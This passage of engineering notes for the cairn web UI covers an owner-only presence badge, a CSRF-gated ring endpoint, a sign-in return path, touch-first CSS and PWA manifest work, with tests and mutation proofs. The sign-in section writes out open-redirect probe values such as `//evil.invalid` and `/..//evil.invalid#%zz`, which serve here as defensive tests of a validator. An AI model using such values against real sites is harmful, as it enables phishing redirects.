| `/arc` (summary, every tab) | `live pane` when any member has one |
| `/arcs` | `live pane` on each arc row with a live member |

The hotkey segment is omitted when the host sent none. "seen" is the UI's clock against the push that
installed the row (`Located.PushedAt`), at second precision — never the host's `last_activity`, which
is that host's clock and appears only in the tooltip, beside the pane's label. The badge shows the
TARGET row (decision 7: newest `last_activity`, ties to the smaller host label), so the host it names
is the one a ring would go to.

## 🔴 One predicate, and "not shown" is NO NODE

Every surface asks `presence.Store.For(viewer, session)` and nothing else: `Server.panesFor` binds it
to the request's WHOLE `identity.Identity` once (the narrowing bit rides on `Auth`, so a viewer rebuilt
from its principal would read a narrowed bearer credential as its owner), and `internal/ui/presence.go`
turns a `false` into no node at all. So a non-owner, a narrowed owner, expired presence, presence for
another session, presence OFF (`Config.Presence` nil) and an empty store all render the SAME bytes —
`TestPresenceIsInvisibleToEveryoneButItsOwner` compares them on all five surfaces as a relationship
over one store, with the owner's page as the positive control and an absolute check that the off page
carries no badge (without it, a renderer drawing a zero-value badge everywhere passed: the first battery
run scored that mutant MISATTRIBUTED).

**Presence never decides whether a page exists (P5).** Each handler binds `Panes` after its refusals,
so the session page's uniform 404 is unchanged for a session the owner has a live pane for
(`TestPresenceNeverMakesAnUnseenSessionAPage` — an INVARIANT guard; no mutant of this change reorders it).

**Wiring.** `cmd/cairn-ui` hands `ui.Config.Presence` the SAME service the agent listener writes, and
only when that listener started; a token file refused at startup leaves the browser presence-off.
`TestTheBrowserReadsTheStoreTheAgentListenerWrites` drives that through `main`: a push on the agent
listener puts the badge on the owner's session page fetched from the browser listener.

`report.ArcAcross` grew `MemberSessions` so `/arcs` can ask the predicate per member; it is never
rendered (the arc page already lists members to anybody who can see the arc).

## The RED proof

Eleven rows in `tests/control_mutants.py` (`ui-presence-*`, `ui-main-never-hands-presence-to-the-browser`),
each run alone with `--only` and killed by the test it names: the badge and the live-pane check each
rendering without the predicate's answer, the viewer rebuilt from its principal, presence never bound,
`also on` dropped, each of the five surfaces' badge dropped, and `main`
never handing the service over. By hand, against the live tree and restored by digest: the predicate's
owner clause, its expiry clause and its session match each turned `TestPresenceIsInvisibleToEveryoneButItsOwner`
red on exactly the arm that clause guards, on all five surfaces.

`uiaudit` boots with presence armed (a push token minted by the binary's own `-issue-presence-token`,
the three listener flags, one row pushed through the real agent route and re-pushed every 60 s), so the
walk captures every surface in its badged state. ⚠ OWNER ONLY, and structurally so: the single-owner wall
refuses any token row for another owner, so a non-owner's presence cannot reach a deployed binary's store.

## What these guards still cannot see

- **A bell** — Phase L had none; it is Phase M (S5), below, with the end-to-end `tests/presence/e2e.sh`.
- **A second replica**: each would hold its own store, so a badge would depend on which replica answered.
- **Whether the host's labels are honest**: a push token can make a badge LIE for ≤ TTL (the plan's
  threat model); the badge renders what the owner's own host sent.

# Phase M — the bell (S5 of the arcs/presence plan)

Slice S5 of `claudedocs/plan-cairn-arcs-presence.md` (O4 with ruling D3, decisions 5, 7, 14). ONE new
row, `POST /ring`; no script, no new asset. The stylesheet gained one selector, `.bell`, so the hashed
stylesheet path moved (the regenerated `app.css` is committed; `checks.ui-stylesheet-is-current` pins it).

| what | where |
|---|---|
| the button | a `<form class="bell" method="post" action="/ring" data-presence="bell">` with the CSRF field and a hidden `session`, inside the session page's presence container — a `div`, never a `p` (a `<form>` start tag closes an open `<p>`, so a parser would move the bell out) — after the badge |
| not rendered | anywhere the badge is not; on the scope/arc session rows and `/arcs` (S5 places it on the session page only — a ring from a row would 303 the viewer away from the list); and on a request with no session cookie (no token to carry, so the form could only ever 403) |
| the answer | `303 Location: /session?session=<id>`, no body, for EVERY request that passes both cross-site gates |

`TestTheBellRendersOnlyBesideTheOwnersBadge` pins the first two rows: the bell renders for the owner,
inside the presence container and not inside an open `<p>` (the open-element check at the form's start
tag, with its own controls in `TestTheOpenElementTrackerSeesAnOpenParagraph`; it reads explicit tags only),
and every non-owner state renders bytes identical to presence OFF **with a session cookie present** — the
state S4's byte-identity test never built, since S4 had nothing that depends on the CSRF token.

## 🔴 One predicate, one answer

`handleRing` (`bell.go`) calls `presence.Service.Ring(id, session)` with the request's WHOLE identity, and
`Service.Ring` queues only when `presence.Store.For(viewer, session)` returns the target row — the same
call the badge renders from. So another owner's presence, expired presence, a narrowed viewer, presence
for another session, an empty store and presence OFF all queue nothing, and all of them, the owner's
queued ring, a repeat while pending and an id outside the trailer grammar get the SAME status, headers
and body (`TestEveryRingAnswerIsTheSameRedirect`, a relationship against the presence-OFF answer). The
owner gets no "rang" message on purpose: an answer that said so would depend on whether a pane exists for
this viewer. The terminal is the feedback. The one other exit is a 500 when the ring id's randomness
fails, reachable only by a viewer the predicate already showed a pane.

**The queue is S2's, unchanged** (O4/D3): one pending ring per `(owner, session)` — a repeat while one
is pending is a no-op that does NOT restart its 60 s clock (`TestARepeatWhilePendingQueuesNoSecondRing`:
a keyed map would hold one ring either way, so the guard is the ring's AGE, not the count) — and the ring
goes to the host decision 7 picks AT ENQUEUE TIME (`TestTheRingGoesToTheBadgesHost`). The TTL is pinned
through the route at 59 s (claimed exactly once) and 61 s (gone) by `TestARungRingLivesSixtySeconds` on
the queue's injected clock.

**Both cross-site gates reach the row by METHOD** — it is class `0`, like `/sign-out`.
`TestTheRingRowIsBehindBothCrossSiteGates` asserts no `Origin`, a foreign `Origin`, no token and another
session's token each by its gate's OWN message, with the queue unchanged after each and a positive control
that the same request with both gates satisfied queues one ring.

⚠ **It does not ask whether the viewer can read a write of the session.** The bell is never RENDERED for
such a session (the session page's 404 comes first, P5), but a hand-built POST naming the owner's own
live session is queued: the predicate is about the pane, which is the owner's.

## The end-to-end check: `tests/presence/e2e.sh`

Closing condition (1) of the plan. It builds `cmd/cairn-ui` and `cmd/cairn-server`, seeds two users and
three credentials (one NARROWED) with `-create-user`/`-issue-credential`, mints presence tokens with
`-issue-presence-token`, boots `cairn-ui` with presence armed, and asserts clauses (a)–(f) — 19 `PASS`
lines, pinned as `EXPECTED`; fewer is exit 2. A missing `go`, `curl` or `python3` is exit 2, never a skip.
`--self-test` sabotages each clause on a scratch copy of the tree and requires THAT clause's assertion to
go red: (a) the 14-day window, (b) the predicate's owner clause, (c) `Service.Ring` reading the store
without the predicate, (d) the token reader's per-row owner check, (e) the target pick inverted, (f) the
narrowing bit and the sign-in refusal — `SUMMARY e2e-self-test: sabotaged=7 caught=7`. Both run in the
`go` CI job beside `tests/arcs/e2e.sh`, self-test first, with the exact-line checks.

⚠ **Clause (c)'s sabotage is NOT `presence-ring-skips-the-predicate`.** That mutant files a refused ring
under the ZERO owner and an empty host, which no claim token can ever see — so end to end it is
invisible, and it is killed only in process (`TestARingGoesThroughTheOwnerPredicate` reads the `true`
`Service.Ring` returns). The e2e's sabotage reads the target row straight out of the table, so the ring
lands where A's claim service looks; `presence-ring-reads-the-store-without-the-predicate` is the same
edit in the battery.

## The RED proof

Eleven new rows in `tests/control_mutants.py`, each run alone with `--only` under
`PYTHONDONTWRITEBYTECODE=1` and killed by the test it names: the row declared `classPublic` (which skips
the CSRF gate — the "future class" bypass), the handler never asking presence, a queued ring answered
differently, `Service.Ring` reading the store without the predicate, the dedupe dropped, the TTL moved to
62 s and to 58 s, the bell rendered outside the badge's condition, never rendered, rendered with no
token, and its container put back to a `<p>`. Two existing target-pick rows now also list `TestTheRingGoesToTheBadgesHost`. ⚠ The 62 s row
first listed `TestOnePendingRingPerSessionAndItExpires` as a killer and the battery reported it STALE:
that test reads its expiry instant off `DefaultRingTTL` itself, so it moves with the mutant. The route
test's literal 61 s is what pins the bound.

⚠ **The first S5 commit put the bell inside a `<p>`, and its test passed.** The test compared string
offsets (the form's bytes sat between `<p …>` and `</p>`), which an HTML parser does not respect: a
`<form>` start tag closes an open `<p>`, so in the DOM the form landed AFTER the paragraph, followed by a
stray empty `<p>`. An audit found it. The assertion now reads the elements the markup leaves OPEN at the
form's start tag (`openTags` in `bell_test.go`, with its own positive/negative control) and was watched
red on that markup. It is not a parser — no HTML5 parser is in `depspolicy`'s allowlist — so it sees
explicit tags only, not implied end tags or parser-inserted elements; for a `<p>` that is exactly the
shape a parser rewrites.

## What these guards still cannot see

- **The executor** (S3, the tooling repo): whether a claimed ring lights the right window and writes
  only `0x07`. The e2e stops at "claimed by the right agent token".
- **A second replica**: the queue is in memory, so a ring enqueued on one replica is invisible to a
  claim served by another (the plan's P2).
- **A click in a real browser**: `uiaudit` never submits a non-GET row, so the bell is captured
  rendered, never pressed. The e2e drives the POST with `curl` and a real session cookie.

# Phase N — the sign-in return path

An operator report: a bookmarked `/scope?id=scp_…` opened with an expired session answered
`unauthorized` — a 12-byte plain-text page with no way in. Now it is sent to sign-in carrying where
it was going, and lands back there.

| request | answer |
|---|---|
| `GET`, `Accept` containing `text/html`, NO `Authorization` header, authentication fails (no credential, or a cookie that no longer resolves) | `303 Location: /sign-in?next=<request-URI, query-encoded>`; `/sign-in` bare when the request-URI is `/` or one `safeNext` refuses |
| the same, presenting an `Authorization` header (any value, including empty) | `401 unauthorized`, unchanged |
| the same, `Accept: */*` or no `Accept` | `401 unauthorized`, unchanged |
| `HEAD`, any shape | `401 unauthorized`, unchanged — see *No request shape loops* |
| any other method (`POST`, `PUT`, `OPTIONS`, …) | unchanged: gate (2) then the uniform 401 |
| `GET /sign-in?next=X` | the page, with `X` (if `safeNext` accepts it) as a hidden field in BOTH forms |
| `GET /sign-in?next=X` while signed in | `303 Location: X` when `X` is valid; the form otherwise, as before |
| `POST /sign-in` with body `next=X` | success: `303 Location: X` (else `/`); refusal: the page re-rendered with `X` kept |
| `POST /sign-in/github` with body `next=X` | `X` stored on the server-side flight; the callback lands on it |

## 🔴 ONE validator, `safeNext`, at every read

`internal/ui/returnto.go`. Accepts only a same-origin path-absolute reference: non-empty, ≤ 2048
bytes, first byte `/`, no `\` and no `#` anywhere, every byte printable ASCII (0x21–0x7e), and a
path (before `?`) with no empty segment (`//` anywhere — which is also what refuses the
network-path `//evil.invalid`) and no `.`/`..` segment. Anything else becomes `""`, which lands on
`/` and renders no field — never an error page, never an echo. Reads go through it in exactly two
places: `requestedNext` (the query on `GET`, the posted
body ONLY on every other method — a `?next=` on a POST's URL is ignored, the invite token's rule) and
`safeNext(flightNext)` in the callback, which re-validates the stored value at use. The redirect
builder (`signInLocation`) validates the request-URI it is about to carry.

⚠ **`openSession` and `renderSignIn` do NOT validate again, deliberately.** A third check would be a
guard no test can reach, since every caller hands them a value its door already validated; each
door's own check is reachable and was watched red.

⚠ **Percent-escapes are not decoded for the shape rules.** `/%2F%2Fevil.invalid` is ACCEPTED: a
browser resolving a `Location` treats `%2F` as data, so it lands on a path on THIS origin (which
answers 404). `TestAnEscapedSlashPairLandsOnThisOrigin` pins the Location and resolves it against
the origin. Nothing in `safeNext` decodes. The redirect carries `RequestURI()`, never the decoded
`URL.Path`, so an escaped request is carried as it arrived.

⚠ **`#` and dot/empty segments are refused because of `http.Redirect`, measured.** A fragment
carrying an invalid escape (`/..//evil.invalid#%zz`) makes `url.Parse` fail, so `http.Redirect`
skips its `path.Clean` and emits the value RAW; a browser then removes the dot segment and lands on
the same-origin PATH `//evil.invalid`. Not exploitable as served, but one rewrite from a
network-path reference — so the shape is refused rather than left to `path.Clean` to normalise, and
the value validated is the value sent. Browsers never send a fragment in a request-URI, so the `#`
rule loses nothing. `/..//evil.invalid` without a fragment is refused by the same rules.

## 🔴 There is no sign-in loop check — it was deleted, and why

The first version refused `next` values naming `/sign-in`, `/sign-out` or either GitHub row,
decoding the path to do it, on the premise that `next=/sign-out` would sign a person straight back
out. **False:** `/sign-out` is POST-only, so a 303 there is a GET that answers 404 and revokes
nothing — `TestANextOfSignOutSignsNobodyOut` signs in with `next=/sign-out`, follows the landing
(404) and requires the session to still answer 200. What remained was a nuisance landing, and the
check was the validator's only decode step, so it went (with its mutant row).

## 🔴 No request shape loops — and `HEAD` is why the redirect is `GET`-only

The first version redirected `HEAD` too. No row answers `HEAD`, so a redirected `HEAD` lands on
`/sign-in`, is not routed, reaches gate (4) again and is redirected to `/sign-in` again, for ever —
measured on `/`, `/arcs?all=1`, `/sign-in` and `/join?token=x` (the base answered 401). Browsers
never navigate with `HEAD`, so `HEAD` keeps the 401. `TestNoUnauthenticatedRequestShapeLoops`
follows every `Location`, keeping the method, for `GET` and `HEAD` × signed out / signed in × with
and without a dead cookie × ten targets, and requires a non-3xx within 5 hops; it does not depend
on the deleted loop check.

⚠ **The deletion opened one redirect chain, and the first version of that test could not see it.**
With `/sign-in` accepted, the signed-in shortcut followed `next=/sign-in?next=…` one nesting level
per hop — 1, 21 and 140 hops at depths 1, 21 and 140; 140 levels is ~1,966 bytes, inside
`maxNextLen`, and a browser reports "too many redirects". The test's deepest target was depth 2,
so "within 5 hops" held. Now the shortcut sends a `next` whose DECODED path is `/sign-in` to `/`
(not the form: the form would carry that `next`, and a completed sign-in would land straight back
here); `safeNext` is unchanged. The walk carries a 140-deep target held to ≤1 hop — red at
`13e2008` (capped at 6 by the walk; 140 uncapped), green after (1 hop, landing `/`).

## 🔴 The redirect is not an oracle

`signInLocation` is a function of the request-URI and nothing else; it runs at gate (4), before
the ledger and before any handler, and consults no store, session table or route.
`TestTheSignInRedirectIsUniformAcrossWhatTheTargetNames` asserts both halves: responses for an
existing scope, a missing scope, an existing entry, a missing entry and a missing arc are
byte-identical (status, every header, body) once the echoed target is substituted, AND the source
was consulted **0** times — against a non-zero count on an authenticated positive control over
the same counter. Unknown paths redirect too, so a browser cannot tell a route from a typo either.

## 🔴 The bearer split is by PRESENCE of the header

Both header-borne backends read `Authorization`; a client that sends one is a program holding a
credential and gets the 401 it was written against. Presence, not validity, and not non-emptiness:
an empty `Authorization:` header is still a program. `Accept: text/html` is the second half — kept
from the root-only branch so `curl` (`*/*`) and a browser's own `/favicon.ico` fetch keep the 401.
⚠ That `Accept` condition is NARROWER than "any GET without `Authorization`", deliberately: it
keeps the documented machine contract and costs no browser navigation.

## The GitHub flight carries `next` server-side

`flight.next`, beside `flight.invite`, for the same reasons minus secrecy: a cookie would be
client-held state that outlives the flow, and the provider redirect URL is where an attacker
crafting a callback link would put a value. Validated at start (`requestedNext`) and at use
(`safeNext` in the callback), cleared with the verifier and the invite on consume.
`TestTheGitHubFlightCarriesTheReturnPathServerSide` reads the table's internals for the stored and
cleared halves and checks that neither the provider Location nor any cookie carries it;
`TestTheCallbackRevalidatesTheReturnPathAtUse` plants `//evil.invalid` on a record directly — the
only way to reach the use-time check — and requires a landing on `/`.

## The RED proof

Regression tests red at the base (`a20ebab`), run black-box against the base tree:
`TestAnUnauthenticatedBrowserIsSentToSignInWithItsReturnPath` (every row answered 401) and
`TestAnExpiredCookieIsSentToSignInAndTheCredentialFormLandsBack` (the expired cookie answered 401).
`TestAFailedBearerAndANonBrowserKeepTheUniform401` was GREEN at the base — an **invariant guard**
for the machine contract, not regression coverage. `TestTheRootRedirectsABrowserAndRefusesEverythingElse`
moved two rows (`/share`, `/admin`) from 401 to 303 deliberately, kept `HEAD /` at 401, and gained
a failed-bearer row, which at the base answered **303**: the old root branch did not look at
`Authorization`.

The audit round's fixes, red at the PR's first head (`94d3107`, the current tests dropped into an
export of that tree) and green now: `TestNoUnauthenticatedRequestShapeLoops` (18 `HEAD` shapes
"still redirecting after 5 hops"), `TestANextOfSignOutSignsNobodyOut` (landed on `/`, not
`/sign-out`), `TestAFailedBearerAndANonBrowserKeepTheUniform401`'s browser-`HEAD` row (303), the
root test's `HEAD /` row (303), and the corpus's fragment, dot-segment, empty-segment and
now-accepted sign-in rows.

Twenty-nine hand mutants, each one textual edit, each run against the named test and required to
fail with that test's own message, the tree restored and digest-checked after each, with an unedited
positive control running all fourteen tests green: every `safeNext` rule (empty segment / network
path, backslash, `#`, control bytes, dot segments, length, scheme), the loop check RESTORED, the
redirect predicate admitting `HEAD`, admitting every method, ignoring `Accept` and ignoring
`Authorization`, presence-vs-value, the Location dropping `next` or carrying the decoded path,
both landings forced to `/`, the refusal dropping `next`, `FormValue` for `PostFormValue`, either
form losing its field, the flight dropping/not clearing/not re-validating `next`, the start row not
validating, the signed-in shortcut removed or ignoring the identity, and the redirect consulting
the source or varying by target — 29 killed. Seven of them are rows in `tests/control_mutants.py`
(`ui-next-*`, `ui-redirect-answers-a-failed-bearer-with-html`, `ui-redirect-admits-head`), each run
alone with `--only` under `PYTHONDONTWRITEBYTECODE=1`: `killed=1` each. Round 2 added an eighth,
`ui-signed-in-shortcut-follows-the-sign-in-page`, killed by the deep target's own ≤1-hop message.

## What these guards still cannot see

- **A real browser's click path.** No Playwright/`uiaudit` walk signs out, opens a deep page and
  signs back in; the round trip is driven in process with `httptest`. `uiaudit`'s redirect guard
  REFUSES a capture that lands on `/sign-in`, which is the right outcome and not a measurement of
  this flow.
- **The GitHub provider end to end.** The stub provider is in process; the real GoTrue redirect is
  not exercised, so "the provider URL carries no `next`" is a claim about what THIS process builds.
- **Browser-specific URL parsing beyond the corpus.** The rules are the WHATWG shapes known to turn
  a path into an authority (`//`, `\`, stripped tab/newline); a parser quirk outside them is not
  tested here.

# Phase O — touch-first CSS (S1 of the mobile plan)

`claudedocs/plan-cairn-mobile-pwa.md`, decision 14 and B1–B3. The stylesheet gains ONE block, at
the end of `@layer components` in `tailwind.css`: `@media (pointer: coarse) { … }`. No route and no
script. `render.go` gains one attribute: the header's viewer line carries a `title` with the whole
sentence, because the touch block truncates it. `app.css` is regenerated (`nix run
.#build-ui-stylesheet`), so the hashed stylesheet path moves.

## 🔴 Keyed on the POINTER, never on a width or on `hover`

A narrow desktop window has a mouse and wants the dense layout; a tablet has a thumb and does not.
And it is the one key the harness can DRIVE: `uiaudit` turns `(pointer: coarse)` on at its `mobile`
and `tablet` rungs and REFUSES a walk where it does not match, while headless chromium answers
`hover: none` at every width. The fallback if emulation ever stops matching is the plan's R10:
the same block under `(width < 64rem)`.

## What the block does, per surface

| surface | before (390px) | under a coarse pointer |
|---|---|---|
| header (every signed-in page) | two rows, 80px; nav links 16px tall | a GRID placed in DOM order: row 1 the wordmark and the three nav links (equal 44px targets, B2); row 2 the viewer line (truncated, `text-xs`, full text in `title`) and Sign out. 101px at 390 and 834 |
| text fields and selects (`#q`, `#entry-filter`, `#token`, `#subject`) | 14px, 38px tall | `font-size: max(16px, 1em)` (iOS zooms below 16px), 44px tall |
| submit buttons (sign in, search, share, sign out, revoke, the bell) | 22–38px | ≥ 44×44; the bell (B3) was 49×22 |
| breadcrumbs, view tabs, card titles, row refs, session/arc row links, the arcs toggle, chip links, search-hit links | 14–28px | ≥ 44×44, and `max-w-full` + `wrap-anywhere` so a name with no break opportunity wraps |
| share / invite index rows | 38px | 44px, still full width, wrapping |
| document card headings that print a scope name as text | — | `wrap-anywhere` |
| scope-page entry rows (B1) — `#entry-list > .entry-row` ONLY | the ref was the row's ONLY link, ~14px | the ref is 44px AND stretches an overlay over the whole row (the `.row-link` pattern); the row's chip links sit above it at `z-10` |
| share form verb checkboxes | 13px | 24px; the LABEL around each is the 44px row |

🔴 **The header keeps DOM order.** The first draft put the viewer and Sign out on row 1 with `order`,
after three nav links on row 2, so focus and a screen reader jumped back up (WCAG 2.4.3 / 1.3.2).
A grid that auto-places in source order cannot disagree with the source. A `render.go` reorder was
the alternative and was rejected: it would move the desktop header's DOM, and its reading order.

🔴 **B1 is the scope page's rows alone.** `.entry-row` is also a session page's bullet, an arc page's
scope and member rows, and an arcs-index row. The first draft reached all of them, and there the
overlay swallowed taps on excerpts and badges and blocked long-press text selection. `#entry-list`
is the scope page's list alone (the id `filter.js` already uses), so no `render.go` change was needed.

🔴 **`inline-flex` alone broke wrapping, and the walk could not see it.** A flex box's text is a flex
item whose minimum width is its min-content, which for an unbreakable name is the whole name.
`.card-head h2`'s `break-words` stopped mattering and a long scope name pushed `/` sideways at 390px.
`overflow-wrap: anywhere` is the wrapping rule that also shrinks min-content. `uiaudit` now carries
a 42-character unbreakable fixture scope so the overflow refusal can see this shape. That fixture
ALSO showed that the base tree overflowed at 390px on 13 captures (the scope-list links, document card headings, arc rows' ref
links, the share pages — measured by element). Those are fixed for coarse pointers by the same rules. ⚠ A narrow FINE-pointer
window still overflows on such a name, as it did before S1; that is unchanged by design and unmeasured.

⚠ **The 16px input rule is inside the coarse block**, not "at EVERY width" as decision 14 first said
(amended, operator-accepted). The zoom it prevents is iOS Safari's, which reports a coarse pointer.
Keeping it in the block is what makes the fine-pointer rendering identical to the base. Residual,
unmeasured: a WebKit that reports a FINE primary pointer and still zooms on focus keeps 14px, and the
iPhone checklist covers iPhone only.

## 🔴 Desktop is unchanged — measured, not assumed (the ONE place this is stated)

The full `uiaudit` walk, chromium 154.0.8037.92, the S1 round-1 harness (with the unbreakable fixture
scope), on the BASE stylesheet (`d4a1dda`) and on S1:

- **Capture lines.** Every laptop, desktop and ultrawide capture line is byte-identical between base
  and S1, in both worlds. A line holds the status, axe, tap<44, text<12, overflow, `<main>` width and
  fraction, coarse, target-size, box<24 and input<16. Two runs of the base are also identical, which
  is the control that says the comparison can match at all.
- **Screenshots.** Of the 51 desktop (1440px) screenshots, 44 and 43 are byte-identical against the
  base in two S1 runs. Every other one is a session/presence page, and it differs only inside one
  live "Ns ago" timestamp box (≤ 1398 pixels). The two S1 runs differ from EACH OTHER the same way,
  and so did an earlier base-vs-base pair.
- **Harness note.** The base walk REFUSES under this harness (input font, and the pre-existing
  overflow above). So its screenshots came from a scratch copy whose refusal prints instead of exiting.
  Nothing else in that copy differs.

`uiaudit/README.md` and the touch block's comment in `tailwind.css` point here rather than restating it.

## The gate

`uiaudit` refuses, at the touch rungs of both worlds:
- any axe `target-size` (WCAG 2.5.8) node;
- any text-entry input under 16px;
- the measured-nothing shapes of both.

At every rung it refuses a header whose DOM order differs from its visual order. The before/after
table and the red/green matrix are in `uiaudit/README.md` ("S1").

🔴 **The 44px size is REPORTED, not refused — an operator decision.** There is no hard floor on boxes
under 24 or 44px. The counts stay in the walk's summary. A lone button shrunk back to 22px passes 2.5.8's
spacing exception (measured with the bell), so that case is caught only by review and by the REPORTED
sub-24px count.

## What these guards still cannot see

- **Any WebKit.** The iOS zoom, iPadOS's pointer answer and every on-device behaviour are the
  plan's iPhone checklist, not a test.
- **The 44px goal itself**, by decision (above).
- **`hover:` rules**, at every width (headless answers `hover: none`).
- **The invite mint form**, which neither `uiaudit` world renders (no `-db-dsn`). Its `select` and
  submit are covered only through the block's element/type selectors (`select`,
  `button[type="submit"]`), not through any class of their own, and nothing has measured them.
- **Which per-scope share pages the journal world walks** is bounded and keyed on random ids. So
  whether the long-name scope's share page is captured varies run to run. A scratch probe of all
  8 at 390px read 0 overflow on S1.

# Phase P — the installable surface: manifest, icons, `pwaHead` (S2 of the mobile plan)

`claudedocs/plan-cairn-mobile-pwa.md`, decisions 1–4 and B6. `pwa.go` holds all of it. There is NO
service worker (O13) and NO script: S2 is installable on Chromium from a manifest alone, which the
plan measured (`Page.getInstallabilityErrors` = `[]` with no worker) and `uiaudit/pwa_test.go`
re-measures on every run.

## 🔴 Inert unless a deployment arms it

`cmd/cairn-ui -app-name` (`$CAIRN_UI_APP_NAME`) arms it and has NO default. Unarmed:
- `GET /manifest.webmanifest` answers `404 no such route` — what an AUTHENTICATED caller gets for a
  path that is not a row. ⚠ NOT what an ANONYMOUS caller gets for one: the chain refuses an unrouted
  path 401 (303 to sign-in for a browser) while this public row answers 404 ahead of it, and the 16
  icon rows answer 200 on every deployment. So "unarmed" is not invisible; it hides nothing the
  public repository does not already say;
- no frame emits any PWA head element — `pwaHead(App{})` returns NO node.

Armed, every frame carries four elements, once each: `<link rel="manifest">`, one
`<meta name="theme-color">`, `<link rel="icon">` (the variant's 192px PNG) and
`<link rel="apple-touch-icon">` (its 180px PNG, which iOS reads INSTEAD of the manifest icons).

| flag (variable) | default | refused when |
|---|---|---|
| `-app-name` (`CAIRN_UI_APP_NAME`) | none — unset is unarmed | written blank (whitespace, zero-width, or an explicit `-app-name=`) |
| `-app-icon-variant` (`CAIRN_UI_APP_ICON_VARIANT`) | none — REQUIRED with a name (O6) | missing with a name (names the flag); outside `ui.IconVariants()` (names the set); written blank |
| `-app-short-name` (`CAIRN_UI_APP_SHORT_NAME`) | omitted from the manifest | more than 12 characters (runes; 12 is admitted); written blank |

A short name or a variant with NO name is NOT refused: the surface starts UNARMED and logs one
`WARNING … IGNORED` line naming each ignored setting. Deleting the name line is how a deployment
disarms, and a refusal there would crash-loop the pod on that edit (an earlier draft refused it; the
plan never asked for that). All three are read RAW
(`rawEnvNames`), for `controlJournalDefault`'s reason — through `envalias` a whitespace value reads as
unset, and an operator who meant to arm the app would get a surface that silently is not installable.
The shape checks live in `ui.App.Validate` (one place; `New` calls it); `cmd/cairn-ui/app.go` only
rewords its sentinels in flag names. Every refusal exits 78 before anything is opened. The startup
line ends `app "<name>" (icon variant <v>)` or `app unarmed (…)`, read off the `ui.Config` the server
was handed. ⚠ `-app-name` is PUBLIC: the manifest is served before sign-in.

## The rows

- `GET /manifest.webmanifest` — `classPublic` (Chromium fetches a manifest WITHOUT credentials), a
  FIXED path, `application/manifest+json`, `Cache-Control: no-cache`, `nosniff`. `encoding/json` over a
  struct, never string assembly. Members: `id`/`start_url`/`scope` `/`, `display: standalone`, `name`,
  optional `short_name`, a constant `description`, `theme_color` = `background_color` = the surface
  colour, and the SELECTED variant's three manifest icons (192 any, 512 any, 512 maskable). No
  `display_override`; `shortcuts` and `screenshots` are S4's.
- One `GET /static/icon-<variant>-<kind>.<sha256[:12]>.png` row PER COMMITTED FILE, for EVERY variant —
  16 rows, `classPublic`, `immutable`. The ledger never depends on configuration; only the selected
  variant is LINKED. Added to `routes` by `pwa.go`'s `init`, one computed EXACT key each (the
  stylesheet row's argument: the served set stays finite, and the near-misses are probed).

## 🔴 Icons: committed build output of a template, ONE list, two readers

`icons/variants.json` lists four neutral variants (`amber`, `teal`, `violet`, `slate` — never an
instance's name, Q9) and four kinds. `flake.nix`'s `uiIcons` reads it with `builtins.fromJSON`,
substitutes each variant's colours into `icons/any.svg` (rounded tile) or `icons/full.svg` (full-bleed,
cairn scaled 0.72 into the maskable 80% safe zone) and renders every variant × kind with the pinned
resvg. No text in either template, so no font dimension. `pwa.go` embeds the same json and the PNGs;
`onlyGo` derives the PNG names from the json rather than listing them. Regenerate with
`nix run .#build-ui-icons`.

🔴 **The comparison is also the leak gate.** `tests/leakscan.py` skips a PNG by name. What keeps a
committed icon free of anything private is that `checks.ui-icons-are-current` requires it to EQUAL the
render of two scanned text files — the plan's provenance argument (T10), enforced.

## 🔴 The theme colour is derived, never typed (B6)

`themeColour` is read out of the EMBEDDED `app.css` at init (`--color-surface: oklch(0.21 0.008 75)`)
and converted to sRGB (`#1a1814`). A hand-converted hex would be a second spelling of the token that
a palette change leaves behind; an absent token panics at init. One colour, no `media` variants: the
palette is dark always.

## Ledgers moved together

The hand ledger (`TestTheRouteLedgerMatchesTheDispatchTable`: variants and kinds spelled by hand, each
digest recomputed from the file on disk), `bareGETAnswer` (manifest 404 unarmed; icons 200), the
near-miss probes (`/manifest.webmanifestx`, `/manifest.webmanifest/`, `/manifest.json`, an icon with a
suffixed, truncated, zero or empty digest, an unknown variant), `uiaudit`'s `notADocument`, `onlyGo`,
`flake.nix` (`uiIcons`, `apps.build-ui-icons`, `checks.ui-icons-are-current` and its CI step),
`rawEnvNames`, and nine `tests/control_mutants.py` rows. `AllowedScriptSources` did NOT move: one
entry, until S4.

## The RED proof

Each guard was watched fail with its own test, on a scratch copy with no `.git`:

| mutant | killed by |
|---|---|
| the manifest row loses `classPublic` | `TestTheManifestAnswersAnAnonymousCaller` (+ the hand ledger) |
| the manifest `name` is the literal `"cairn"` | `TestTheManifestIsBuiltFromTheConfiguredApp` |
| the unarmed 404 branch removed | `TestAnUnarmedServerServesNoManifestAndNoPWAHead` (+ `bareGETAnswer`) |
| `SignInPage` drops `pwaHead` | `TestEveryFrameCallsPWAHead` (AST) (+ `TestEveryArmedHTMLPageCarriesThePWAHead`) |
| `pwaHead` emits `/static/pwa.js` a slice early | `TestTheArmedPWAHeadAddsNoScript` |
| the blank-line refusal removed | `cmd/cairn-ui` `TestEachAppLineIsJudgedWithItsOwnRefusal` (+ the binary test) |
| the variant made optional when armed | `TestAppValidateRefusesEachShape` (a DIFFERENT sentinel fires) (+ both cmd tests) |
| a variant outside the set admitted | `TestAppValidateRefusesEachShape` (+ both cmd tests) |
| the manifest lists every variant's icons | `TestTheManifestIsBuiltFromTheConfiguredApp` |

Those nine are battery rows (each `killed`, extras held). Outside the battery, the same way: a stray
`amber-64.png` → `TestTheEmbeddedIconSetIsExactlyVariantsTimesKinds`; the 180px file copied over a
192 → `TestEveryIconIsAPNGOfItsDeclaredSize`; `amber-512` copied over `teal-512` →
`TestTwoVariantsNeverShareAnIcon`; an icon row serving one byte short →
`TestTheIconRowsServeTheCommittedBytes`; the sRGB transfer dropped, and the colour hardcoded →
`TestTheThemeColourIsTheStylesheetSurface`; `/arcs` or `/join` forgetting `App` →
`TestEveryArmedHTMLPageCarriesThePWAHead`; the head linking another variant's favicon → the same; a
prefix match on `/static/icon-` → `TestEveryServedPathComesFromTheLedger`; `main` not handing `App` to
`ui.Config` → `TestTheBinaryServesTheManifestItWasArmedWith`; `>=` for `>` on the short name →
`TestAppValidateRefusesEachShape`, `TestEachAppLineIsJudgedWithItsOwnRefusal` and
`TestTheBinaryServesTheManifestItWasArmedWith`; a byte count for the rune count →
`TestAppValidateRefusesEachShape`; the no-name refusal dropped → `TestAppValidateRefusesEachShape` and
`TestEachAppLineIsJudgedWithItsOwnRefusal`;
`immutable` on the manifest, and `display: browser` → `TestTheManifestIsBuiltFromTheConfiguredApp`.

Audit round 0/1 (D1): the old exit-78 refusal restored for a variant with no name →
